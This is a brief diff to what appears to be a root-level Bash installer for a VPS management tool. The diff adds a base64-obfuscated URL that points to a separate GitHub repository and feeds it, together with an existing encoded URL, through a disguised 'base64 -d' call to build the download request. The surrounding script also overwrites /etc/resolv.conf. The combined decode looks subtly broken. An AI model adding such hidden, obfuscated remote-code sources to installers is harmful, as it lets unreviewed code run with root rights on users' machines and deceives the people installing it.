@@ -8,6 +8,7 @@ SCPusr="${SCPdir}/ger-user"
 SCPfrm="/etc/ger-frm"
 SCPfrm3="/etc/adm-lite"
 SCPinst="/etc/ger-inst"
+lista="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nhc2l0YWRlbHRlcnJvci9zY3JpcHRzL21hc3Rlci9saXN0YS9saXN0YS1hcnE="
 kalix1="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZQUy1NWC9WUFMtTVgtOC4wL21hc3Rlci9TQ1JJUFQ="
 SUB_DOM='base64 -d'
 echo "nameserver 8.8.8.8" > /etc/resolv.conf
@@ -325,7 +326,7 @@ msg -bar2
 [[ ${#1} -gt 2 ]] && funcao_idioma || id="$1"
  }
 Key="qra-atsilK0@84%ab97cda8f?K8888:8@@+95+84?+94@"
-REQUEST=$(echo $kalix1|$SUB_DOM)
+REQUEST=$(echo $kalix1 $lista|$SUB_DOM)
 echo "$IP" > /usr/bin/vendor_code
 cd $HOME
 msg -ne "Key: "
